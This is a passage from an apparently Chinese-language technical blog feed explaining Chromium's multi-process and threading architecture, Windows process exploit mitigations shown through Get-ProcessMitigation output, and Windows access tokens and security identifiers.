id="组件与接口"><a href="#组件与接口" class="headerlink" title="组件与接口"></a>组件与接口</h2><p>In the render process:</p><ul><li><em>RenderProcess</em>通过浏览器中和其对应的<em>RenderProcessHost</em>来处理 IPC。每个渲染进程只有一个RenderProcess对象。所有浏览器-渲染器之间都采用这种方式通信。</li><li>RenderView 对象与浏览器进程中相应的 RenderView 和 WebKit 嵌入层通信（通过RenderProcess）。这个对象代表了一个网页在标签页或一个弹出窗口的内容。</li></ul><p>In the browser process:</p><ul><li>Browser 对象代表了顶级浏览器窗口</li><li>RenderProcessHost 对象代表了浏览器端的浏览器与渲染器的IPC连接。在浏览器进程里，每个渲染进程有一个RenderProcessHost对象。</li><li>RenderViewHost 对象封装与远程 RenderView 的通信，RenderWidgetHost 在浏览器中处理输入和 RenderWidget的绘制。</li></ul><h2 id="共享渲染过程"><a href="#共享渲染过程" class="headerlink" title="共享渲染过程"></a>共享渲染过程</h2><p>通常，每个新的 window 或标签页是在一个新进程里打开的。浏览器会生成一个新的进程，然后指导它去创建一个<em>RenderView</em>。但有时候在标签页或窗口之间共享渲染进程是有必要的。</p><p>这些策略在<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/General_Architecture/Process_Models.html">Process Models</a>里有阐述。</p><h2 id="检测-Crash-OR-异常渲染"><a href="#检测-Crash-OR-异常渲染" class="headerlink" title="检测 Crash OR 异常渲染"></a>检测 Crash OR 异常渲染</h2><p>每个和浏览器进程通信的 IPC 都会检测进程的句柄，如果句柄是 signaled，则代表渲染进程 Crashed 相应的标签页也会收到 Crash 的信息。这是 Chromium 将显示一个 sad tab 屏幕，通知用户渲染器已崩溃，该页面可以通过按重新加载按钮或启动新的导航来重新加载。</p><h2 id="Sandboxing-the-renderer"><a href="#Sandboxing-the-renderer" class="headerlink" title="Sandboxing the renderer"></a>Sandboxing the renderer</h2><p>renderer的进程被沙箱化，其权限进行了如下的限制：</p><ul><li>渲染器只能通过其父浏览器进程访问网络</li><li>主机操作系统的内置权限限制了它对文件系统的访问</li><li>rederer 进程运行在单独的Windows桌面上，该桌面对用户是不可见的。</li><li>限制对用户的display 和 related对象的访问</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md">https://www.cntofu.com/book/101/zh/Start_Here_Background_Reading/Multi-process_Architecture.md</a></p><p>[2] <a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html">https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh/Start_Here_Background_Reading/Multi-process_Architecture.html</a></p><h1 id="如何显示网页"><a href="#如何显示网页" class="headerlink" title="如何显示网页"></a>如何显示网页</h1><h2 id="应用概念层"><a href="#应用概念层" class="headerlink" title="应用概念层"></a>应用概念层</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723160221.png"></p><p>每个矩形代表一个应用概念层，每层之间互不相通，层与层之间也没有任何依赖关系。</p><ul><li><strong>WebKit：</strong>Safari，Chromium和其他所有基于 WebKit 的浏览器共享的渲染引擎。WebKit Port是WebKit的一个部分，用来集成平台独立的系统服务，比如资源加载与图像。</li><li><strong>Glue:</strong> 将WebKit类型转换为Chromium类型。该层是 WebKit 的嵌入层。</li><li><strong>Renderer / Render host:</strong> Chromium 多进程架构的嵌入层，代理通知，跨进程边界执行命令。</li><li><strong>WebContents：</strong>一个可重用的组件，它是 Content 模块的主类。它易于嵌入，允许多进程将HTML绘制成View。</li><li><strong>Browser:</strong> 浏览器窗口，它包含多个 WebContentses。</li><li><strong>Tab Helpers</strong>: 可以附加到WebContents的各个对象（通过WebContentsUserData Mixin）。浏览器将这些独立对象中的一种绑定到WebContent给它持有（一个用于Favicons，一个用于infobars）</li></ul><h2 id="The-render-process"><a href="#The-render-process" class="headerlink" title="The render process"></a>The render process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210723170306.png"></p><p>Chromium 的渲染进程通过 glue接口将 WebKit 端口嵌入。它的工作主要是作为渲染器端到浏览器的<a href="https://ahangchen.gitbooks.io/chromium_doc_zh/content/zh//Start_Here_Background_Reading/General_Architecture">IPC</a>通道。</p><p>reder 中最重要的类是<code>RenderView</code>，在 <code>/content/renderer/render_view_impl.cc</code>。这个对象代表一个 web 网页，处理浏览器进程之间的所有导航相关命令，派生于<code>RenderWidget</code>（RenderWidget 提供绘图和输入事件处理）。RenderView 通过全局 RenderProcess 对象与浏览器进程通信。</p><blockquote><p>RenderWidget 和 RenderView 之间的区别：</p><p>RenderWidget 通过 glue 层(WebWidgetDelegate)的抽象接口映射到一个WebCore:：Widget对象。这基本是屏幕上的一个窗口，用于接收输入事件并在其中进行绘制。</p><p>RenderView 继承自 RenderWidget，代表标签页或弹窗的内容。除了绘制与组件输入事件外，它还处理导航指令。只有一种情况下，RenderWidget可以在没有RenderView时存在，就是网页中的下拉选择框（select box）。下拉选择框必须用native window来渲染（因为其没有独立 web 网页）。</p></blockquote><h3 id="Threads-in-the-renderer"><a href="#Threads-in-the-renderer" class="headerlink" title="Threads in the renderer"></a>Threads in the renderer</h3><p>每个渲染器都有两个线程，The render thread is where the main objects such as the RenderView and all WebKit code run。当渲染器线程与浏览器通信时，消息首先被发送到主线程，然后主线程将消息发送到浏览器进程。除了这种方式，同样还允许我们从渲染器同步地向浏览器发送消息，这种情况一般发生在，需要浏览器返回的结果才能继续执行的事件。例如，在 JavaScript 请求获取页面的cookie时，渲染器线程会阻塞，主线程将对接收到的所有消息排队，直到找到正确的响应。在此期间接收到的任何消息，在这之后都会分配到渲染器线程以进行正常处理。</p><h2 id="The-browser-process"><a href="#The-browser-process" class="headerlink" title="The browser process"></a>The browser process</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210725225424.png"></p><h3 id="Low-level-browser-process-objects"><a href="#Low-level-browser-process-objects" class="headerlink" title="Low-level browser process objects"></a>Low-level browser process objects</h3><p>所有 IPC 与渲染进程的通信都通过浏览器的 I/O线程来完成的，此线程还处理所有网络通信，以防止其干扰用户界面。</p><p>当一个 RenderProcessHost 对象在主线程(用户界面运行的地方)完成初始化时，它会创造新的渲染器进程和一个ChannelProxy IPC对象(具有一个命名了的管道通向渲染器)，自动转发所有的消息回给UI线程的RenderProcessHost。该对象运行在浏览器的 I/O 线程上，监听渲染器的命名管道，并自动将所有消息转发回 UI 线程上的RenderProcessHost。ResourceMessageFilter 也将安装在此通道中，它将过滤掉某些可以直接在I/O线程上处理的消息，如网络请求。筛选的过程发生在 <code>ResourceMessageFilter::OnMessageReceived</code>。</p><p>UI线程中的RenderProcessHost负责分发所有view相关消息给合适的 RenderViewHost（它自己处理有限数量的与非View特定的消息）此调度发生在RenderProcessHost:：OnMessageReceived中。</p><h3 id="High-level-browser-process-objects"><a href="#High-level-browser-process-objects" class="headerlink" title="High-level browser process objects"></a>High-level browser process objects</h3><p>View-specific 信息源于RenderViewHost::OnMessageReceived。大多数消息都在这里处理，其余的转发到RenderWidgetHost基类。这两个对象映射到渲染器中的 RenderView 和 RenderWidget，每个平台都有一个View类以集成到native view系统。</p><p>在RenderView / Widget上方是 WebContents 对象，大部分的消息结束于这个对象的函数调用。WebContents代表网页的内容，它是内容模块中的顶级对象，负责在一个矩形的view中展示网页。</p><p>WebContents 对象包含在 TabContentsWrapper 中。在<code>chrome /</code>中，负责一个标签页。 </p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome">https://www.chromium.org/developers/design-documents/displaying-a-web-page-in-chrome</a></p><h1 id="Threading-and-Tasks-in-Chrome"><a href="#Threading-and-Tasks-in-Chrome" class="headerlink" title="Threading and Tasks in Chrome"></a>Threading and Tasks in Chrome</h1><p>Chrome 是基于多进程架构的，每个进程又是多线程的。多进程架构主要目的是为了让主线程(例如 Browser 进程中的 UI 线程)和 IO 线程（进程中处理 IPC 消息的线程）保持快速响应。Chromium希望尽量保持UI处于响应状态。为此遵循如下设计原则：</p><ul><li>不在UI线程上执行任何阻塞I/O操作，以及其它耗时操作。</li><li>少用锁和线程安全对象</li><li>避免阻塞I/O线程</li><li>线程之间不要互相阻塞</li><li>在数据准备好更新到共享缓冲时才用锁（在准备数据期间不要用锁）</li></ul><h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><ul><li><strong>Task</strong>: task 是一个待处理的工作单元，也可以理解为是具有可选关联状态的函数指针。In Chrome this is <code>base::OnceCallback</code> and <code>base::RepeatingCallback</code> created via <code>base::BindOnce</code> and <code>base::BindRepeating</code>, respectively. (<a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/callback.md">documentation</a>).</li><li><strong>Task queue</strong>: 待处理的任务队列。</li><li><strong>Physical thread</strong>: 操作系统提供的线程 (e.g. pthread on POSIX or CreateThread() on Windows). The Chrome cross-platform abstraction is <code>base::PlatformThread</code>. </li><li><strong><code>base::Thread</code></strong>: A physical thread 永远处理来自专用任务队列的消息，直到 Quit()。</li><li><strong>Thread pool</strong>: 具有共享任务队列的物理线程池. In Chrome, this is <code>base::ThreadPoolInstance</code>. </li><li><strong>Sequence</strong> or <strong>Virtual thread</strong>: chrome 管理的执行线程。与 physical thread 一样，在任何给定时刻只有一个任务可以在给定的 sequence / virtual thread 线程上运行，并且每个任务都可以看到前面任务的副作用。 任务会按顺序执行，但可能会在每个physical thread之间跳转。</li><li><strong>Task runner</strong>: 一个可以发布任务的界面. In Chrome this is <code>base::TaskRunner</code>.</li><li><strong>Sequenced task runner</strong>: 任务运行程序，它保证发布到它的任务将按发布顺序运行。每个这样的任务都能看到它之前的任务的副作用，发布到序列任务运行器的任务通常由单个线程（virtual or physical）处理。 In Chrome this is <code>base::SequencedTaskRunner</code> which is-a <code>base::TaskRunner</code>.</li><li><strong>Single-thread task runner</strong>: 一个有序的任务运行程序，它保证所有任务都由相同的物理(physical)线程处理。 In Chrome this is <code>base::SingleThreadTaskRunner</code> which is-a <code>base::SequencedTaskRunner</code>. </li></ul><h2 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h2><p>每个 chrome 的进程都包含如下线程：</p><ul><li>主线程<ul><li>in the browser process (BrowserThread::UI): updates the UI</li><li>in renderer processes (Blink main thread): runs most of Blink</li></ul></li><li>IO 线程<ul><li>在所有进程中：所有IPC消息都到达该线程，处理消息的应用程序逻辑可能位于不同的线程中（IO线程可能将消息路由到绑定到不同线程的Mojo接口）</li><li>大多数异步 I/O 都发生在这个线程上 (base::FileDescriptorWatcher).</li><li>浏览器进程下是<code>BrowserThread::IO</code></li></ul></li><li>一些专用线程</li><li>一个通用线程池</li></ul><p>大多数线程都有一个循环，用以从队列中获取任务并运行它们（队列可以在多个线程之间共享）。</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>task 是用以异步执行的工作单元，由<code>base::OnceClosure</code>添加到队列。<code>base::OnceClosure</code>存储着函数指针和参数，通过 <code>Run()</code>来调用所存储的函数指针。<code>base::OnceClosure</code>通过<code>base::BindOnce</code></p><p>来声明。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskA</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TaskB</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> task_a = base::BindOnce(&amp;TaskA);</span><br><span class="line"><span class="keyword">auto</span> task_b = base::BindOnce(&amp;TaskB, <span class="number">42</span>);</span><br></pre></td></tr></table></figure><h3 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h3><ul><li>并行(Parallel)：没有任务执行顺序，可能在任何线程上执行所有任务（通过线程池实现）</li><li>顺序执行(Sequenced)：在任何线程上，按照提交顺序一次执行一个任务（通过 <code>SequencedTaskRunner</code> 实现）</li><li>单线程(Single Threaded)：按发送顺序执行的任务，在单个线程上一次执行一个任务 (通过 <code>SingleSuqenceTaskRunner</code> 实现)<ul><li>COM Single Threaded：COM已初始化的单线程的变体。</li></ul></li></ul><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] <a href="https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md">https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> Architecture </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Mitigation</title>
      <link href="posts/ee684c01/"/>
      <url>posts/ee684c01/</url>
      
        <content type="html"><![CDATA[<p>我们可以使用<code>Get-ProcessMitigation</code>来查询某一进程所开启的保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\air\Desktop&gt; Get-ProcessMitigation 12092</span><br><span class="line"></span><br><span class="line">ProcessName                      : msedge</span><br><span class="line">Source                           : Running Process</span><br><span class="line">Id                               : 12092</span><br><span class="line"></span><br><span class="line">DEP:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    EmulateAtlThunks                   : ON</span><br><span class="line"></span><br><span class="line">ASLR:</span><br><span class="line">    BottomUp                           : ON</span><br><span class="line">    ForceRelocateImages                : OFF</span><br><span class="line">    RequireInfo                        : OFF</span><br><span class="line">    HighEntropy                        : ON</span><br><span class="line"></span><br><span class="line">StrictHandle:</span><br><span class="line">    Enable                             : OFF</span><br><span class="line"></span><br><span class="line">System Call:</span><br><span class="line">    DisableWin32kSystemCalls           : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ExtensionPoint:</span><br><span class="line">    DisableExtensionPoints             : ON</span><br><span class="line"></span><br><span class="line">DynamicCode:</span><br><span class="line">    BlockDynamicCode                   : OFF</span><br><span class="line">    AllowThreadsToOptOut               : OFF</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">CFG:</span><br><span class="line">    Enable                             : ON</span><br><span class="line">    SuppressExports                    : OFF</span><br><span class="line">    StrictControlFlowGuard             : OFF</span><br><span class="line"></span><br><span class="line">BinarySignature:</span><br><span class="line">    MicrosoftSignedOnly                : ON</span><br><span class="line">    AllowStoreSignedBinaries           : OFF</span><br><span class="line">    AuditMicrosoftSignedOnly           : OFF</span><br><span class="line">    AuditStoreSigned                   : OFF</span><br><span class="line"></span><br><span class="line">FontDisable:</span><br><span class="line">    DisableNonSystemFonts              : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">ImageLoad:</span><br><span class="line">    BlockRemoteImageLoads              : ON</span><br><span class="line">    AuditRemoteImageLoads              : OFF</span><br><span class="line">    BlockLowLabelImageLoads            : ON</span><br><span class="line">    AuditLowLabelImageLoads            : OFF</span><br><span class="line">    PreferSystem32                     : OFF</span><br><span class="line">    AuditPreferSystem32                : OFF</span><br><span class="line"></span><br><span class="line">Payload:</span><br><span class="line">    EnableExportAddressFilter          : OFF</span><br><span class="line">    AuditEnableExportAddressFilter     : OFF</span><br><span class="line">    EnableExportAddressFilterPlus      : OFF</span><br><span class="line">    AuditEnableExportAddressFilterPlus : OFF</span><br><span class="line">    EnableImportAddressFilter          : OFF</span><br><span class="line">    AuditEnableImportAddressFilter     : OFF</span><br><span class="line">    EnableRopStackPivot                : OFF</span><br><span class="line">    AuditEnableRopStackPivot           : OFF</span><br><span class="line">    EnableRopCallerCheck               : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line">    EnableRopSimExec                   : OFF</span><br><span class="line">    AuditEnableRopCallerCheck          : OFF</span><br><span class="line"></span><br><span class="line">Child Process:</span><br><span class="line">    DisallowChildProcessCreation       : ON</span><br><span class="line">    Audit                              : OFF</span><br><span class="line"></span><br><span class="line">User Shadow Stack:</span><br><span class="line">    UserShadowStack                    : OFF</span><br><span class="line">    UserShadowStackStrictMode          : OFF</span><br><span class="line">    AuditUserShadowStack               : OFF</span><br><span class="line">    SetContextIpValidation             : OFF</span><br><span class="line">    AuditSetContextIpValidation        : OFF</span><br><span class="line">    BlockNonCetBinaries                : OFF</span><br><span class="line">    BlockNonCetBinariesNonEhcont       : OFF</span><br><span class="line">    AuditBlockNonCetBinaries           : OFF</span><br></pre></td></tr></table></figure><p>其功能介绍如下：</p><table><thead><tr><th align="left"><strong>Mitigation</strong></th><th align="left"><strong>Description</strong></th><th align="left"><strong>Default</strong></th><th align="left"><strong>Level</strong></th></tr></thead><tbody><tr><td align="left">Control flow guard (CFG)</td><td align="left">CFG通过在编译和链接期间，记录下所有的间接调用信息，并把他们记录在最终的可执行文件中，并且在所有的间接调用之前插入额外的校验，当间接调用的地址被篡改时，会触发一个异常，操作系统介入处理。</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Data Execution Prevention (DEP)</td><td align="left"><strong>数据执行保护</strong>，和 LINUX 下的 NX 保护比较类似，堆栈只有读写权限，没有执行权限，主要用途是限制以写 shellcode 为主的攻击手段</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Force randomization for images (Mandatory ASLR)</td><td align="left">强制重定位未使用/DYNAMICBASE 编译的映像</td><td align="left">Off</td><td align="left">System &amp; app</td></tr><tr><td align="left">Randomize memory allocations (Bottom-Up ASLR)</td><td align="left">虚拟内存地址分配随机化</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate exception chains (SEHOP)</td><td align="left">在程序转入异常处理前，SEHOP会检查SEH链，特别是最后一个异常处理函数是否为系统固定的终极异常处理函数，确保其完整性</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Validate heap integrity</td><td align="left">当检测到堆损坏时，终止进程</td><td align="left">On</td><td align="left">System &amp; app</td></tr><tr><td align="left">Arbitrary code guard (ACG)</td><td align="left">阻止未(经过微软)签名的模块加载，禁止创建未签名的可执行页，保护签名过的代码页使其不能被修改</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block low integrity images</td><td align="left">防止加载标记为低完整性的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block remote images</td><td align="left">防止从远程设备加载图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Block untrusted fonts</td><td align="left">防止加载任何未安装在系统字体目录中的基于GDI的字体，特别是来自web的字体</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Code integrity guard</td><td align="left">限制加载Microsoft，WHQL或更高版本签名的图像</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable extension points</td><td align="left">禁用允许将 DLL 注入所有进程的各种可扩展性机制</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Disable Win32k system calls</td><td align="left">防止应用程序使用Win32k系统调用表</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Don’t allow child processes</td><td align="left">防止应用程序创建子进程</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Export address filtering (EAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Import address filtering (IAF)</td><td align="left">This mitigation detects dangerous operations being resolved by malicious code.</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Simulate execution (SimExec)</td><td align="left">确保敏感 api 的调用返回给合法调用者</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate API invocation (CallerCheck)</td><td align="left">确保调用敏感API的调用者是合法的</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate handle usage</td><td align="left">无效句柄引用后引发异常</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate image dependency integrity</td><td align="left">强制对Windows映像依赖项加载执行代码签名</td><td align="left">N/a</td><td align="left">App</td></tr><tr><td align="left">Validate stack integrity (StackPivot)</td><td align="left">确保堆栈不会被重定向到敏感API</td><td align="left">N/a</td><td align="left">App</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows SID &amp; Integrity Level</title>
      <link href="posts/37e301d0/"/>
      <url>posts/37e301d0/</url>
      
        <content type="html"><![CDATA[<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Access-Tokens"><a href="#Access-Tokens" class="headerlink" title="Access Tokens"></a>Access Tokens</h2><p>访问令牌是一个描述进程或线程上下文安全的对象，令牌中的信息包括与进程或线程相关联的用户的 id 信息和权限。当用户登录时，系统会把用户输入的密码和存储在安全数据库中的信息进行比对，来验证用户的密码。如果密码被认证，系统会产生访问令牌。 此用户执行的每个进程都同样有该访问令牌(a copy of user’s access token)。</p><p>当线程与安全对象交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包含以下信息：</p><ul><li>用户帐户的安全标识符（SID）</li><li>用户所属组的SID</li><li>标识当前登录会话的登录 SID</li><li>用户或用户组所拥有的特权列表</li><li>所有者 SID。An owner SID</li><li>The SID for the primary group</li><li>当用户在不指定<strong>安全描述符</strong>的情况下创建安全对象时，系统默认使用 DACL</li><li>访问令牌的来源</li><li>Whether the token is a primary or impersonation token</li><li>限制SID的可选列表</li><li>Current impersonation levels</li><li>Other statistics</li></ul><p>每个进程都有一个<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly">主令牌</a>，用于描述与该进程关联的用户的<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/s-gly">安全上下文</a>。默认情况下，当进程的线程与安全对象交互时，系统使用主令牌。此外，线程可以模拟 client account。模拟后，允许线程使用客户端的安全上下文与安全对象交互。模拟客户端的线程同时具有主令牌和<a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/i-gly"><em>模拟令牌</em></a>。</p><h2 id="primary-token"><a href="#primary-token" class="headerlink" title="primary token"></a>primary token</h2><p>主要令牌：通常仅由 Windows 内核创建的访问令牌。它可以分配给一个进程来表示该进程的默认安全信息。</p><h2 id="impersonation-token"><a href="#impersonation-token" class="headerlink" title="impersonation token"></a>impersonation token</h2><p>模拟令牌：为捕获客户端进程的安全信息而创建的访问令牌，允许服务器在安全操作中“模拟”客户端进程。</p><h2 id="Restricted-Tokens"><a href="#Restricted-Tokens" class="headerlink" title="Restricted Tokens"></a>Restricted Tokens</h2><p>受限令牌：受限令牌是主访问令牌或模拟访问令牌调用 <a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-createrestrictedtoken"><strong>CreateRestrictedToken</strong></a>方法修改而来。处于受限令牌的安全上下文运行的进程或模拟线程访问安全对象或执行特权操作的能力受到限制，CreatereestrictToken函数可以通过以下方式限制令牌：</p><ul><li>从令牌中删除权限</li><li>将 deny-only 属性应用于令牌中的 sid，以便它们不能用于访问安全对象</li><li>指定限制 SID 的列表，该列表限制对安全对象的访问。</li></ul><p>系统使用限制 SID 列表来检查令牌对安全对象的访问，当受限进程或线程尝试访问安全对象时，系统将执行两个访问检查：一个是使用令牌已启用的 SID，另一个使用受限SID列表。只有这两个访问检查都被通过的时候，才会授予访问者访问权限。</p><h2 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h2><p>包含安全对象的安全信息的结构和关联数据。安全描述符标识对象的所有者和主要组。它还可以包含控制对对象的访问的 DACL 和控制对访问对象的尝试的日志记录的 SACL。</p><h1 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><ul><li>在<a href="https://en.wikipedia.org/wiki/Microsoft">Microsoft </a><a href="https://en.wikipedia.org/wiki/Windows_NT">Windows NT</a>系列<a href="https://en.wikipedia.org/wiki/Operating_system">操作系统</a>的上下文中，<strong>安全标识符</strong>（通常缩写为<strong>SID</strong>）是用户、用户组或其他<a href="https://en.wikipedia.org/wiki/Security_principal">安全主体</a>的唯一的、<a href="https://en.wikipedia.org/wiki/Immutable_object">不可变的</a>标识符。SID在 Windows 中首次创建账户时被创建，一个安全主体（在给定域中）终生有一个 SID，主体的所有属性，包括其名称，都与 SID 相关联。</li><li>SID（安全标识符）是计算机或域控制器用来识别你的唯一ID号，它是分配给 Windows 计算机上的每个用户或域控制网络上的每个用户、组和计算机的一串字母数字字符。</li><li>当我们输入用户名和密码时，Windows 首先会检查我们输入的用户名和其相对应的存储密码是否匹配，之后它会在 Windows注册表中查看与该用户名关联的 SID。用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，会重新获取访问令牌。</li><li>Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。</li></ul><h2 id="SID-解析"><a href="#SID-解析" class="headerlink" title="SID 解析"></a>SID 解析</h2><p>SID 如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\WINDOWS\system32&gt; WMIC useraccount get name,sid</span><br><span class="line">Name                SID</span><br><span class="line">Administrator       S-1-5-21-3018282723-2406670630-2225774231-500</span><br><span class="line">air                 S-1-5-21-3018282723-2406670630-2225774231-1000</span><br><span class="line">DefaultAccount      S-1-5-21-3018282723-2406670630-2225774231-503</span><br><span class="line">Guest               S-1-5-21-3018282723-2406670630-2225774231-501</span><br><span class="line">WDAGUtilityAccount  S-1-5-21-3018282723-2406670630-2225774231-504</span><br></pre></td></tr></table></figure><p>微软通常将其分解为以下模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(SID)-(revision level)-(identifier-authority)-(subauthority)-(etc)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">S</th><th align="center">1</th><th align="center">5</th><th align="center">21-3018282723-2406670630-2225774231</th><th align="center">1000</th></tr></thead><tbody><tr><td align="center">标识为SID</td><td align="center">一直都是 1</td><td align="center">权限值</td><td align="center">子权限值 在这种情况下，域 (21) 具有唯一标识符。可能有多个下级机构，特别是如果该帐户存在于域中并且属于不同的群体</td><td align="center">相对 ID。默认情况下未创建的任何组或用户将具有 1000 或更大的相对 ID。</td></tr></tbody></table><ul><li><p><strong>SID</strong>: 一直都是 S，这个是 SID 的标识符</p></li><li><p><strong>Revision level</strong>: 一直都是 1</p></li><li><p><strong>Identifier-authority</strong>: 用于标识创建 SID 的权限</p><p>  可能的值为：</p><ul><li>0 ( <code>SECURITY_NULL_SID_AUTHORITY</code>) 是<em>空帐户 SID</em> 的所有者<code>S-1-0-0</code>。</li><li>1（ <code>SECURITY_WORLD_SID_AUTHORITY</code>， <em>everyone group</em>）也仅具有一个SID： 